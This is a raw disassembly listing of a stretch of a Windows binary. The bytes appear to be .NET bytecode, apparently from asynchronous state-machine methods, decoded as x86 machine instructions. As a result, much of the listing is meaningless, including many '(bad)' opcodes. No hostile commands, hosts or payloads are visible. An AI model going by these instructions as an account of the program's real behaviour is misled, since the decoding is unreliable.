  4036e9:	0a 07                	or     (%edi),%al
  4036eb:	7b 13                	jnp    0x403700
  4036ed:	00 00                	add    %al,(%eax)
  4036ef:	04 6f                	add    $0x6f,%al
  4036f1:	30 00                	xor    %al,(%eax)
  4036f3:	00 06                	add    %al,(%esi)
  4036f5:	3a 6b fe             	cmp    -0x2(%ebx),%ch
  4036f8:	ff                   	(bad)
  4036f9:	ff 07                	incl   (%edi)
  4036fb:	7b 13                	jnp    0x403710
  4036fd:	00 00                	add    %al,(%eax)
  4036ff:	04 6f                	add    $0x6f,%al
  403701:	2e 00 00             	add    %al,%cs:(%eax)
  403704:	06                   	push   %es
  403705:	de 19                	ficomps (%ecx)
  403707:	13 06                	adc    (%esi),%eax
  403709:	02 1f                	add    (%edi),%bl
  40370b:	fe                   	(bad)
  40370c:	7d 2c                	jge    0x40373a
  40370e:	00 00                	add    %al,(%eax)
  403710:	04 02                	add    $0x2,%al
  403712:	7c 2d                	jl     0x403741
  403714:	00 00                	add    %al,(%eax)
  403716:	04 11                	add    $0x11,%al
  403718:	06                   	push   %es
  403719:	28 3d 00 00 0a de    	sub    %bh,0xde0a0000
  40371f:	13 02                	adc    (%edx),%eax
  403721:	1f                   	pop    %ds
  403722:	fe                   	(bad)
  403723:	7d 2c                	jge    0x403751
  403725:	00 00                	add    %al,(%eax)
  403727:	04 02                	add    $0x2,%al
  403729:	7c 2d                	jl     0x403758
  40372b:	00 00                	add    %al,(%eax)
  40372d:	04 28                	add    $0x28,%al
  40372f:	3e 00 00             	add    %al,%ds:(%eax)
  403732:	0a 2a                	or     (%edx),%ch
  403734:	41                   	inc    %ecx
  403735:	1c 00                	sbb    $0x0,%al
  403737:	00 00                	add    %al,(%eax)
  403739:	00 00                	add    %al,(%eax)
  40373b:	00 0e                	add    %cl,(%esi)
  40373d:	00 00                	add    %al,(%eax)
  40373f:	00 b9 01 00 00 c7    	add    %bh,-0x38ffffff(%ecx)
  403745:	01 00                	add    %eax,(%eax)
  403747:	00 19                	add    %bl,(%ecx)
  403749:	00 00                	add    %al,(%eax)
  40374b:	00 0b                	add    %cl,(%ebx)
  40374d:	00 00                	add    %al,(%eax)
  40374f:	01 1b                	add    %ebx,(%ebx)
  403751:	30 05 00 7e 02 00    	xor    %al,0x27e00
  403757:	00 13                	add    %dl,(%ebx)
  403759:	00 00                	add    %al,(%eax)
  40375b:	11 02                	adc    %eax,(%edx)
  40375d:	7b 31                	jnp    0x403790
  40375f:	00 00                	add    %al,(%eax)
  403761:	04 0a                	add    $0xa,%al
  403763:	02 7b 34             	add    0x34(%ebx),%bh
  403766:	00 00                	add    %al,(%eax)
  403768:	04 0b                	add    $0xb,%al
  40376a:	06                   	push   %es
  40376b:	45                   	inc    %ebp
  40376c:	04 00                	add    $0x0,%al
  40376e:	00 00                	add    %al,(%eax)
  403770:	71 00                	jno    0x403772
  403772:	00 00                	add    %al,(%eax)
  403774:	d3 00                	roll   %cl,(%eax)
  403776:	00 00                	add    %al,(%eax)
  403778:	48                   	dec    %eax
  403779:	01 00                	add    %eax,(%eax)
  40377b:	00 b7 01 00 00 02    	add    %dh,0x2000001(%edi)
  403781:	17                   	pop    %ss
  403782:	8d 2e                	lea    (%esi),%ebp
  403784:	00 00                	add    %al,(%eax)
  403786:	01 25 16 17 9c 7d    	add    %esp,0x7d9c1716
  40378c:	35 00 00 04 02       	xor    $0x2040000,%eax
  403791:	17                   	pop    %ss
  403792:	8d 2e                	lea    (%esi),%ebp
  403794:	00 00                	add    %al,(%eax)
  403796:	01 25 16 18 9c 7d    	add    %esp,0x7d9c1816
  40379c:	36 00 00             	add    %al,%ss:(%eax)
  40379f:	04 02                	add    $0x2,%al
  4037a1:	7b 33                	jnp    0x4037d6
  4037a3:	00 00                	add    %al,(%eax)
  4037a5:	04 20                	add    $0x20,%al
  4037a7:	88 13                	mov    %dl,(%ebx)
  4037a9:	00 00                	add    %al,(%eax)
  4037ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4037ac:	34 00                	xor    $0x0,%al
  4037ae:	00 06                	add    %al,(%esi)
  4037b0:	38 a7 01 00 00 20    	cmp    %ah,0x20000001(%edi)
  4037b6:	e8 03 00 00 28       	call   0x284037be
  4037bb:	6b 00 00             	imul   $0x0,(%eax),%eax
  4037be:	0a 6f 37             	or     0x37(%edi),%ch
  4037c1:	00 00                	add    %al,(%eax)
  4037c3:	0a 0d 12 03 28 38    	or     0x38280312,%cl
  4037c9:	00 00                	add    %al,(%eax)
  4037cb:	0a 2d 3f 02 16 25    	or     0x2516023f,%ch
  4037d1:	0a 7d 31             	or     0x31(%ebp),%bh
  4037d4:	00 00                	add    %al,(%eax)
  4037d6:	04 02                	add    $0x2,%al
  4037d8:	09 7d 37             	or     %edi,0x37(%ebp)
  4037db:	00 00                	add    %al,(%eax)
  4037dd:	04 02                	add    $0x2,%al
  4037df:	7c 32                	jl     0x403813
  4037e1:	00 00                	add    %al,(%eax)
  4037e3:	04 12                	add    $0x12,%al
  4037e5:	03 02                	add    (%edx),%eax
  4037e7:	28 1a                	sub    %bl,(%edx)
  4037e9:	00 00                	add    %al,(%eax)
  4037eb:	2b dd                	sub    %ebp,%ebx
  4037ed:	e8 01 00 00 02       	call   0x24037f3
  4037f2:	7b 37                	jnp    0x40382b
  4037f4:	00 00                	add    %al,(%eax)
  4037f6:	04 0d                	add    $0xd,%al
  4037f8:	02 7c 37 00          	add    0x0(%edi,%esi,1),%bh
  4037fc:	00 04 fe             	add    %al,(%esi,%edi,8)
  4037ff:	15 0a 00 00 01       	adc    $0x100000a,%eax
  403804:	02 15 25 0a 7d 31    	add    0x317d0a25,%dl
  40380a:	00 00                	add    %al,(%eax)
  40380c:	04 12                	add    $0x12,%al
  40380e:	03 28                	add    (%eax),%ebp
  403810:	39 00                	cmp    %eax,(%eax)
  403812:	00 0a                	add    %cl,(%edx)
  403814:	02 7b 33             	add    0x33(%ebx),%bh
  403817:	00 00                	add    %al,(%eax)
  403819:	04 6f                	add    $0x6f,%al
  40381b:	31 00                	xor    %eax,(%eax)
  40381d:	00 06                	add    %al,(%esi)
  40381f:	6f                   	outsl  %ds:(%esi),(%dx)
  403820:	23 00                	and    (%eax),%eax
  403822:	00 0a                	add    %cl,(%edx)
  403824:	13 04 12             	adc    (%edx,%edx,1),%eax
  403827:	04 28                	add    $0x28,%al
  403829:	24 00                	and    $0x0,%al
  40382b:	00 0a                	add    %cl,(%edx)
  40382d:	2d 41 02 17 25       	sub    $0x25170241,%eax
  403832:	0a 7d 31             	or     0x31(%ebp),%bh
  403835:	00 00                	add    %al,(%eax)
  403837:	04 02                	add    $0x2,%al
  403839:	11 04 7d 38 00 00 04 	adc    %eax,0x4000038(,%edi,2)
  403840:	02 7c 32 00          	add    0x0(%edx,%esi,1),%bh
  403844:	00 04 12             	add    %al,(%edx,%edx,1)
  403847:	04 02                	add    $0x2,%al
  403849:	28 1b                	sub    %bl,(%ebx)
  40384b:	00 00                	add    %al,(%eax)
  40384d:	2b dd                	sub    %ebp,%ebx
  40384f:	86 01                	xchg   %al,(%ecx)
  403851:	00 00                	add    %al,(%eax)
  403853:	02 7b 38             	add    0x38(%ebx),%bh
  403856:	00 00                	add    %al,(%eax)
  403858:	04 13                	add    $0x13,%al
  40385a:	04 02                	add    $0x2,%al
  40385c:	7c 38                	jl     0x403896
  40385e:	00 00                	add    %al,(%eax)
  403860:	04 fe                	add    $0xfe,%al
  403862:	15 03 00 00 1b       	adc    $0x1b000003,%eax
  403867:	02 15 25 0a 7d 31    	add    0x317d0a25,%dl
  40386d:	00 00                	add    %al,(%eax)
  40386f:	04 12                	add    $0x12,%al
  403871:	04 28                	add    $0x28,%al
  403873:	26 00 00             	add    %al,%es:(%eax)
  403876:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  403879:	39 fb                	cmp    %edi,%ebx
  40387b:	00 00                	add    %al,(%eax)
  40387d:	00 08                	add    %cl,(%eax)
  40387f:	16                   	push   %ss
  403880:	91                   	xchg   %eax,%ecx
  403881:	2c 6f                	sub    $0x6f,%al
  403883:	02 7b 33             	add    0x33(%ebx),%bh
  403886:	00 00                	add    %al,(%eax)
  403888:	04 02                	add    $0x2,%al
  40388a:	7b 36                	jnp    0x4038c2
  40388c:	00 00                	add    %al,(%eax)
  40388e:	04 6f                	add    $0x6f,%al
  403890:	32 00                	xor    (%eax),%al
  403892:	00 06                	add    %al,(%esi)
  403894:	6f                   	outsl  %ds:(%esi),(%dx)
  403895:	2b 00                	sub    (%eax),%eax
  403897:	00 0a                	add    %cl,(%edx)
  403899:	13 05 12 05 28 2c    	adc    0x2c280512,%eax
  40389f:	00 00                	add    %al,(%eax)
  4038a1:	0a 2d 41 02 18 25    	or     0x25180241,%ch
  4038a7:	0a 7d 31             	or     0x31(%ebp),%bh
  4038aa:	00 00                	add    %al,(%eax)
  4038ac:	04 02                	add    $0x2,%al
  4038ae:	11 05 7d 39 00 00    	adc    %eax,0x397d
  4038b4:	04 02                	add    $0x2,%al
  4038b6:	7c 32                	jl     0x4038ea
  4038b8:	00 00                	add    %al,(%eax)
  4038ba:	04 12                	add    $0x12,%al
  4038bc:	05 02 28 1c 00       	add    $0x1c2802,%eax
  4038c1:	00 2b                	add    %ch,(%ebx)
  4038c3:	dd 11                	fstl   (%ecx)
  4038c5:	01 00                	add    %eax,(%eax)
  4038c7:	00 02                	add    %al,(%edx)
  4038c9:	7b 39                	jnp    0x403904
  4038cb:	00 00                	add    %al,(%eax)
  4038cd:	04 13                	add    $0x13,%al
  4038cf:	05 02 7c 39 00       	add    $0x397c02,%eax
  4038d4:	00 04 fe             	add    %al,(%esi,%edi,8)
  4038d7:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  4038dc:	02 15 25 0a 7d 31    	add    0x317d0a25,%dl
  4038e2:	00 00                	add    %al,(%eax)
  4038e4:	04 12                	add    $0x12,%al
  4038e6:	05 28 2d 00 00       	add    $0x2d28,%eax
  4038eb:	0a 26                	or     (%esi),%ah
  4038ed:	38 87 00 00 00 02    	cmp    %al,0x2000000(%edi)
  4038f3:	7b 33                	jnp    0x403928
  4038f5:	00 00                	add    %al,(%eax)
  4038f7:	04 02                	add    $0x2,%al
  4038f9:	7b 35                	jnp    0x403930
  4038fb:	00 00                	add    %al,(%eax)
  4038fd:	04 6f                	add    $0x6f,%al
  4038ff:	32 00                	xor    (%eax),%al
  403901:	00 06                	add    %al,(%esi)
  403903:	6f                   	outsl  %ds:(%esi),(%dx)
  403904:	2b 00                	sub    (%eax),%eax
  403906:	00 0a                	add    %cl,(%edx)
  403908:	13 05 12 05 28 2c    	adc    0x2c280512,%eax
  40390e:	00 00                	add    %al,(%eax)
  403910:	0a 2d 41 02 19 25    	or     0x25190241,%ch
  403916:	0a 7d 31             	or     0x31(%ebp),%bh
  403919:	00 00                	add    %al,(%eax)
  40391b:	04 02                	add    $0x2,%al
  40391d:	11 05 7d 39 00 00    	adc    %eax,0x397d
  403923:	04 02                	add    $0x2,%al
  403925:	7c 32                	jl     0x403959
  403927:	00 00                	add    %al,(%eax)
  403929:	04 12                	add    $0x12,%al
  40392b:	05 02 28 1c 00       	add    $0x1c2802,%eax
  403930:	00 2b                	add    %ch,(%ebx)
  403932:	dd a2 00 00 00 02    	frstor 0x2000000(%edx)
  403938:	7b 39                	jnp    0x403973
  40393a:	00 00                	add    %al,(%eax)
  40393c:	04 13                	add    $0x13,%al
  40393e:	05 02 7c 39 00       	add    $0x397c02,%eax
  403943:	00 04 fe             	add    %al,(%esi,%edi,8)
  403946:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  40394b:	02 15 25 0a 7d 31    	add    0x317d0a25,%dl
  403951:	00 00                	add    %al,(%eax)
  403953:	04 12                	add    $0x12,%al
  403955:	05 28 2d 00 00       	add    $0x2d28,%eax
  40395a:	0a 26                	or     (%esi),%ah
  40395c:	02 7b 33             	add    0x33(%ebx),%bh
  40395f:	00 00                	add    %al,(%eax)
  403961:	04 6f                	add    $0x6f,%al
  403963:	30 00                	xor    %al,(%eax)
  403965:	00 06                	add    %al,(%esi)
  403967:	2c 10                	sub    $0x10,%al
  403969:	07                   	pop    %es
  40396a:	7b 13                	jnp    0x40397f
  40396c:	00 00                	add    %al,(%eax)
  40396e:	04 6f                	add    $0x6f,%al
  403970:	30 00                	xor    %al,(%eax)
  403972:	00 06                	add    %al,(%esi)
  403974:	3a 3c fe             	cmp    (%esi,%edi,8),%bh
  403977:	ff                   	(bad)
  403978:	ff 07                	incl   (%edi)
  40397a:	7b 13                	jnp    0x40398f
  40397c:	00 00                	add    %al,(%eax)
  40397e:	04 6f                	add    $0x6f,%al
  403980:	2e 00 00             	add    %al,%cs:(%eax)
  403983:	06                   	push   %es
  403984:	02 7b 33             	add    0x33(%ebx),%bh
  403987:	00 00                	add    %al,(%eax)
  403989:	04 6f                	add    $0x6f,%al
  40398b:	2e 00 00             	add    %al,%cs:(%eax)
  40398e:	06                   	push   %es
  40398f:	de 27                	fisubs (%edi)
  403991:	13 06                	adc    (%esi),%eax
  403993:	02 1f                	add    (%edi),%bl
  403995:	fe                   	(bad)
  403996:	7d 31                	jge    0x4039c9
  403998:	00 00                	add    %al,(%eax)
  40399a:	04 02                	add    $0x2,%al
  40399c:	14 7d                	adc    $0x7d,%al
  40399e:	35 00 00 04 02       	xor    $0x2040000,%eax
  4039a3:	14 7d                	adc    $0x7d,%al
  4039a5:	36 00 00             	add    %al,%ss:(%eax)
  4039a8:	04 02                	add    $0x2,%al
  4039aa:	7c 32                	jl     0x4039de
  4039ac:	00 00                	add    %al,(%eax)
  4039ae:	04 11                	add    $0x11,%al
  4039b0:	06                   	push   %es
  4039b1:	28 3d 00 00 0a de    	sub    %bh,0xde0a0000
  4039b7:	21 02                	and    %eax,(%edx)
  4039b9:	1f                   	pop    %ds
  4039ba:	fe                   	(bad)
  4039bb:	7d 31                	jge    0x4039ee
  4039bd:	00 00                	add    %al,(%eax)
  4039bf:	04 02                	add    $0x2,%al
  4039c1:	14 7d                	adc    $0x7d,%al
  4039c3:	35 00 00 04 02       	xor    $0x2040000,%eax
  4039c8:	14 7d                	adc    $0x7d,%al
  4039ca:	36 00 00             	add    %al,%ss:(%eax)
  4039cd:	04 02                	add    $0x2,%al
  4039cf:	7c 32                	jl     0x403a03
  4039d1:	00 00                	add    %al,(%eax)
  4039d3:	04 28                	add    $0x28,%al
  4039d5:	3e 00 00             	add    %al,%ds:(%eax)
  4039d8:	0a 2a                	or     (%edx),%ch
  4039da:	00 00                	add    %al,(%eax)
  4039dc:	41                   	inc    %ecx
  4039dd:	1c 00                	sbb    $0x0,%al
  4039df:	00 00                	add    %al,(%eax)
  4039e1:	00 00                	add    %al,(%eax)
  4039e3:	00 0e                	add    %cl,(%esi)
  4039e5:	00 00                	add    %al,(%eax)
  4039e7:	00 27                	add    %ah,(%edi)
  4039e9:	02 00                	add    (%eax),%al
  4039eb:	00 35 02 00 00 27    	add    %dh,0x27000002
  4039f1:	00 00                	add    %al,(%eax)
  4039f3:	00 0b                	add    %cl,(%ebx)
  4039f5:	00 00                	add    %al,(%eax)
  4039f7:	01 1b                	add    %ebx,(%ebx)
  4039f9:	30 03                	xor    %al,(%ebx)
  4039fb:	00 b6 02 00 00 12    	add    %dh,0x12000002(%esi)
  403a01:	00 00                	add    %al,(%eax)
  403a03:	11 02                	adc    %eax,(%edx)
  403a05:	7b 3a                	jnp    0x403a41
  403a07:	00 00                	add    %al,(%eax)
  403a09:	04 0a                	add    $0xa,%al
  403a0b:	02 7b 3d             	add    0x3d(%ebx),%bh
  403a0e:	00 00                	add    %al,(%eax)
  403a10:	04 0b                	add    $0xb,%al
  403a12:	06                   	push   %es
  403a13:	45                   	inc    %ebp
  403a14:	05 00 00 00 44       	add    $0x44000000,%eax
  403a19:	00 00                	add    %al,(%eax)
  403a1b:	00 d2                	add    %dl,%dl
  403a1d:	00 00                	add    %al,(%eax)
  403a1f:	00 40 01             	add    %al,0x1(%eax)
  403a22:	00 00                	add    %al,(%eax)
  403a24:	aa                   	stos   %al,%es:(%edi)
  403a25:	01 00                	add    %eax,(%eax)
  403a27:	00 13                	add    %dl,(%ebx)
  403a29:	02 00                	add    (%eax),%al
  403a2b:	00 38                	add    %bh,(%eax)
  403a2d:	32 02                	xor    (%edx),%al
  403a2f:	00 00                	add    %al,(%eax)
  403a31:	02 7b 3c             	add    0x3c(%ebx),%bh
  403a34:	00 00                	add    %al,(%eax)
  403a36:	04 6f                	add    $0x6f,%al
  403a38:	31 00                	xor    %eax,(%eax)
  403a3a:	00 06                	add    %al,(%esi)
  403a3c:	6f                   	outsl  %ds:(%esi),(%dx)
  403a3d:	23 00                	and    (%eax),%eax
  403a3f:	00 0a                	add    %cl,(%edx)
  403a41:	13 04 12             	adc    (%edx,%edx,1),%eax
  403a44:	04 28                	add    $0x28,%al
  403a46:	24 00                	and    $0x0,%al
  403a48:	00 0a                	add    %cl,(%edx)
  403a4a:	2d 41 02 16 25       	sub    $0x25160241,%eax
  403a4f:	0a 7d 3a             	or     0x3a(%ebp),%bh
  403a52:	00 00                	add    %al,(%eax)
  403a54:	04 02                	add    $0x2,%al
  403a56:	11 04 7d 3e 00 00 04 	adc    %eax,0x400003e(,%edi,2)
  403a5d:	02 7c 3b 00          	add    0x0(%ebx,%edi,1),%bh
  403a61:	00 04 12             	add    %al,(%edx,%edx,1)
  403a64:	04 02                	add    $0x2,%al
  403a66:	28 1d 00 00 2b dd    	sub    %bl,0xdd2b0000
  403a6c:	49                   	dec    %ecx
  403a6d:	02 00                	add    (%eax),%al
  403a6f:	00 02                	add    %al,(%edx)
  403a71:	7b 3e                	jnp    0x403ab1
  403a73:	00 00                	add    %al,(%eax)
  403a75:	04 13                	add    $0x13,%al
  403a77:	04 02                	add    $0x2,%al
  403a79:	7c 3e                	jl     0x403ab9
  403a7b:	00 00                	add    %al,(%eax)
  403a7d:	04 fe                	add    $0xfe,%al
  403a7f:	15 03 00 00 1b       	adc    $0x1b000003,%eax
  403a84:	02 15 25 0a 7d 3a    	add    0x3a7d0a25,%dl
  403a8a:	00 00                	add    %al,(%eax)
  403a8c:	04 12                	add    $0x12,%al
  403a8e:	04 28                	add    $0x28,%al
  403a90:	26 00 00             	add    %al,%es:(%eax)
  403a93:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  403a96:	39 e5                	cmp    %esp,%ebp
  403a98:	01 00                	add    %eax,(%eax)
  403a9a:	00 08                	add    %cl,(%eax)
  403a9c:	16                   	push   %ss
  403a9d:	91                   	xchg   %eax,%ecx
  403a9e:	0d 09 45 05 00       	or     $0x54509,%eax
  403aa3:	00 00                	add    %al,(%eax)
  403aa5:	05 00 00 00 6e       	add    $0x6e000000,%eax
  403aaa:	00 00                	add    %al,(%eax)
  403aac:	00 dc                	add    %bl,%ah
  403aae:	00 00                	add    %al,(%eax)
  403ab0:	00 43 01             	add    %al,0x1(%ebx)
  403ab3:	00 00                	add    %al,(%eax)
  403ab5:	48                   	dec    %eax
  403ab6:	01 00                	add    %eax,(%eax)
  403ab8:	00 38                	add    %bh,(%eax)
  403aba:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403abb:	01 00                	add    %eax,(%eax)
  403abd:	00 07                	add    %al,(%edi)
  403abf:	02 7b 3c             	add    0x3c(%ebx),%bh
  403ac2:	00 00                	add    %al,(%eax)
  403ac4:	04 28                	add    $0x28,%al
  403ac6:	1a 00                	sbb    (%eax),%al
  403ac8:	00 06                	add    %al,(%esi)
  403aca:	6f                   	outsl  %ds:(%esi),(%dx)
  403acb:	37                   	aaa
  403acc:	00 00                	add    %al,(%eax)
  403ace:	0a 13                	or     (%ebx),%dl
  403ad0:	05 12 05 28 38       	add    $0x38280512,%eax
  403ad5:	00 00                	add    %al,(%eax)
  403ad7:	0a 2d 41 02 17 25    	or     0x25170241,%ch
  403add:	0a 7d 3a             	or     0x3a(%ebp),%bh
  403ae0:	00 00                	add    %al,(%eax)
  403ae2:	04 02                	add    $0x2,%al
  403ae4:	11 05 7d 3f 00 00    	adc    %eax,0x3f7d
  403aea:	04 02                	add    $0x2,%al
  403aec:	7c 3b                	jl     0x403b29
  403aee:	00 00                	add    %al,(%eax)
  403af0:	04 12                	add    $0x12,%al
  403af2:	05 02 28 1e 00       	add    $0x1e2802,%eax
  403af7:	00 2b                	add    %ch,(%ebx)
  403af9:	dd bb 01 00 00 02    	fnstsw 0x2000001(%ebx)
  403aff:	7b 3f                	jnp    0x403b40
  403b01:	00 00                	add    %al,(%eax)
  403b03:	04 13                	add    $0x13,%al
  403b05:	05 02 7c 3f 00       	add    $0x3f7c02,%eax
  403b0a:	00 04 fe             	add    %al,(%esi,%edi,8)
  403b0d:	15 0a 00 00 01       	adc    $0x100000a,%eax
  403b12:	02 15 25 0a 7d 3a    	add    0x3a7d0a25,%dl
  403b18:	00 00                	add    %al,(%eax)
  403b1a:	04 12                	add    $0x12,%al
  403b1c:	05 28 39 00 00       	add    $0x3928,%eax
  403b21:	0a 38                	or     (%eax),%bh
  403b23:	3c 01                	cmp    $0x1,%al
  403b25:	00 00                	add    %al,(%eax)
  403b27:	07                   	pop    %es
  403b28:	7b 14                	jnp    0x403b3e
  403b2a:	00 00                	add    %al,(%eax)
  403b2c:	04 02                	add    $0x2,%al
  403b2e:	7b 3c                	jnp    0x403b6c
  403b30:	00 00                	add    %al,(%eax)
  403b32:	04 6f                	add    $0x6f,%al
  403b34:	0a 00                	or     (%eax),%al
  403b36:	00 06                	add    %al,(%esi)
  403b38:	6f                   	outsl  %ds:(%esi),(%dx)
  403b39:	37                   	aaa
  403b3a:	00 00                	add    %al,(%eax)
  403b3c:	0a 13                	or     (%ebx),%dl
  403b3e:	05 12 05 28 38       	add    $0x38280512,%eax
  403b43:	00 00                	add    %al,(%eax)
  403b45:	0a 2d 41 02 18 25    	or     0x25180241,%ch
  403b4b:	0a 7d 3a             	or     0x3a(%ebp),%bh
  403b4e:	00 00                	add    %al,(%eax)
  403b50:	04 02                	add    $0x2,%al
  403b52:	11 05 7d 3f 00 00    	adc    %eax,0x3f7d
  403b58:	04 02                	add    $0x2,%al
  403b5a:	7c 3b                	jl     0x403b97
  403b5c:	00 00                	add    %al,(%eax)
  403b5e:	04 12                	add    $0x12,%al
  403b60:	05 02 28 1e 00       	add    $0x1e2802,%eax
  403b65:	00 2b                	add    %ch,(%ebx)
  403b67:	dd 4d 01             	fisttpll 0x1(%ebp)
  403b6a:	00 00                	add    %al,(%eax)
  403b6c:	02 7b 3f             	add    0x3f(%ebx),%bh
  403b6f:	00 00                	add    %al,(%eax)
  403b71:	04 13                	add    $0x13,%al
  403b73:	05 02 7c 3f 00       	add    $0x3f7c02,%eax
  403b78:	00 04 fe             	add    %al,(%esi,%edi,8)
  403b7b:	15 0a 00 00 01       	adc    $0x100000a,%eax
  403b80:	02 15 25 0a 7d 3a    	add    0x3a7d0a25,%dl
  403b86:	00 00                	add    %al,(%eax)
  403b88:	04 12                	add    $0x12,%al
  403b8a:	05 28 39 00 00       	add    $0x3928,%eax
  403b8f:	0a 38                	or     (%eax),%bh
  403b91:	eb 00                	jmp    0x403b93
  403b93:	00 00                	add    %al,(%eax)
  403b95:	07                   	pop    %es
  403b96:	02 7b 3c             	add    0x3c(%ebx),%bh
  403b99:	00 00                	add    %al,(%eax)
  403b9b:	04 08                	add    $0x8,%al
  403b9d:	28 17                	sub    %dl,(%edi)
  403b9f:	00 00                	add    %al,(%eax)
  403ba1:	06                   	push   %es
  403ba2:	6f                   	outsl  %ds:(%esi),(%dx)
  403ba3:	37                   	aaa
  403ba4:	00 00                	add    %al,(%eax)
  403ba6:	0a 13                	or     (%ebx),%dl
  403ba8:	05 12 05 28 38       	add    $0x38280512,%eax
  403bad:	00 00                	add    %al,(%eax)
  403baf:	0a 2d 41 02 19 25    	or     0x25190241,%ch
  403bb5:	0a 7d 3a             	or     0x3a(%ebp),%bh
  403bb8:	00 00                	add    %al,(%eax)
  403bba:	04 02                	add    $0x2,%al
  403bbc:	11 05 7d 3f 00 00    	adc    %eax,0x3f7d
  403bc2:	04 02                	add    $0x2,%al
  403bc4:	7c 3b                	jl     0x403c01
  403bc6:	00 00                	add    %al,(%eax)
  403bc8:	04 12                	add    $0x12,%al
  403bca:	05 02 28 1e 00       	add    $0x1e2802,%eax
  403bcf:	00 2b                	add    %ch,(%ebx)
  403bd1:	dd e3                	fucom  %st(3)
  403bd3:	00 00                	add    %al,(%eax)
  403bd5:	00 02                	add    %al,(%edx)
  403bd7:	7b 3f                	jnp    0x403c18
  403bd9:	00 00                	add    %al,(%eax)
  403bdb:	04 13                	add    $0x13,%al
  403bdd:	05 02 7c 3f 00       	add    $0x3f7c02,%eax
  403be2:	00 04 fe             	add    %al,(%esi,%edi,8)
  403be5:	15 0a 00 00 01       	adc    $0x100000a,%eax
  403bea:	02 15 25 0a 7d 3a    	add    0x3a7d0a25,%dl
  403bf0:	00 00                	add    %al,(%eax)
  403bf2:	04 12                	add    $0x12,%al
  403bf4:	05 28 39 00 00       	add    $0x3928,%eax
  403bf9:	0a 2b                	or     (%ebx),%ch
  403bfb:	67 dd a5 00 00       	frstor 0x0(%di)
  403c00:	00 07                	add    %al,(%edi)
  403c02:	02 7b 3c             	add    0x3c(%ebx),%bh
  403c05:	00 00                	add    %al,(%eax)
  403c07:	04 08                	add    $0x8,%al
  403c09:	28 19                	sub    %bl,(%ecx)
  403c0b:	00 00                	add    %al,(%eax)
  403c0d:	06                   	push   %es
  403c0e:	6f                   	outsl  %ds:(%esi),(%dx)
  403c0f:	37                   	aaa
  403c10:	00 00                	add    %al,(%eax)
  403c12:	0a 13                	or     (%ebx),%dl
  403c14:	05 12 05 28 38       	add    $0x38280512,%eax
  403c19:	00 00                	add    %al,(%eax)
  403c1b:	0a 2d 3e 02 1a 25    	or     0x251a023e,%ch
  403c21:	0a 7d 3a             	or     0x3a(%ebp),%bh
  403c24:	00 00                	add    %al,(%eax)
  403c26:	04 02                	add    $0x2,%al
  403c28:	11 05 7d 3f 00 00    	adc    %eax,0x3f7d
  403c2e:	04 02                	add    $0x2,%al
  403c30:	7c 3b                	jl     0x403c6d
  403c32:	00 00                	add    %al,(%eax)
  403c34:	04 12                	add    $0x12,%al
  403c36:	05 02 28 1e 00       	add    $0x1e2802,%eax
  403c3b:	00 2b                	add    %ch,(%ebx)
  403c3d:	de 7a 02             	fidivrs 0x2(%edx)
  403c40:	7b 3f                	jnp    0x403c81
  403c42:	00 00                	add    %al,(%eax)
  403c44:	04 13                	add    $0x13,%al
  403c46:	05 02 7c 3f 00       	add    $0x3f7c02,%eax
  403c4b:	00 04 fe             	add    %al,(%esi,%edi,8)
  403c4e:	15 0a 00 00 01       	adc    $0x100000a,%eax
  403c53:	02 15 25 0a 7d 3a    	add    0x3a7d0a25,%dl
  403c59:	00 00                	add    %al,(%eax)
  403c5b:	04 12                	add    $0x12,%al
  403c5d:	05 28 39 00 00       	add    $0x3928,%eax
  403c62:	0a 02                	or     (%edx),%al
  403c64:	7b 3c                	jnp    0x403ca2
  403c66:	00 00                	add    %al,(%eax)
  403c68:	04 6f                	add    $0x6f,%al
  403c6a:	30 00                	xor    %al,(%eax)
  403c6c:	00 06                	add    %al,(%esi)
  403c6e:	2c 10                	sub    $0x10,%al
  403c70:	07                   	pop    %es
  403c71:	7b 13                	jnp    0x403c86
  403c73:	00 00                	add    %al,(%eax)
  403c75:	04 6f                	add    $0x6f,%al
  403c77:	30 00                	xor    %al,(%eax)
  403c79:	00 06                	add    %al,(%esi)
  403c7b:	3a b1 fd ff ff 02    	cmp    0x2fffffd(%ecx),%dh
  403c81:	7b 3c                	jnp    0x403cbf
  403c83:	00 00                	add    %al,(%eax)
  403c85:	04 6f                	add    $0x6f,%al
  403c87:	2e 00 00             	add    %al,%cs:(%eax)
  403c8a:	06                   	push   %es
  403c8b:	de 19                	ficomps (%ecx)
  403c8d:	13 06                	adc    (%esi),%eax
  403c8f:	02 1f                	add    (%edi),%bl
  403c91:	fe                   	(bad)
  403c92:	7d 3a                	jge    0x403cce
  403c94:	00 00                	add    %al,(%eax)
  403c96:	04 02                	add    $0x2,%al
  403c98:	7c 3b                	jl     0x403cd5
  403c9a:	00 00                	add    %al,(%eax)
  403c9c:	04 11                	add    $0x11,%al
  403c9e:	06                   	push   %es
  403c9f:	28 3d 00 00 0a de    	sub    %bh,0xde0a0000
  403ca5:	13 02                	adc    (%edx),%eax
  403ca7:	1f                   	pop    %ds
  403ca8:	fe                   	(bad)
  403ca9:	7d 3a                	jge    0x403ce5
  403cab:	00 00                	add    %al,(%eax)
  403cad:	04 02                	add    $0x2,%al
  403caf:	7c 3b                	jl     0x403cec
  403cb1:	00 00                	add    %al,(%eax)
  403cb3:	04 28                	add    $0x28,%al
  403cb5:	3e 00 00             	add    %al,%ds:(%eax)
  403cb8:	0a 2a                	or     (%edx),%ch
  403cba:	00 00                	add    %al,(%eax)
  403cbc:	41                   	inc    %ecx
  403cbd:	1c 00                	sbb    $0x0,%al
  403cbf:	00 00                	add    %al,(%eax)
  403cc1:	00 00                	add    %al,(%eax)
  403cc3:	00 0e                	add    %cl,(%esi)
  403cc5:	00 00                	add    %al,(%eax)
  403cc7:	00 7b 02             	add    %bh,0x2(%ebx)
  403cca:	00 00                	add    %al,(%eax)
  403ccc:	89 02                	mov    %eax,(%edx)
  403cce:	00 00                	add    %al,(%eax)
  403cd0:	19 00                	sbb    %eax,(%eax)
  403cd2:	00 00                	add    %al,(%eax)
  403cd4:	0b 00                	or     (%eax),%eax
  403cd6:	00 01                	add    %al,(%ecx)
  403cd8:	1b 30                	sbb    (%eax),%esi
  403cda:	04 00                	add    $0x0,%al
  403cdc:	c3                   	ret
  403cdd:	00 00                	add    %al,(%eax)
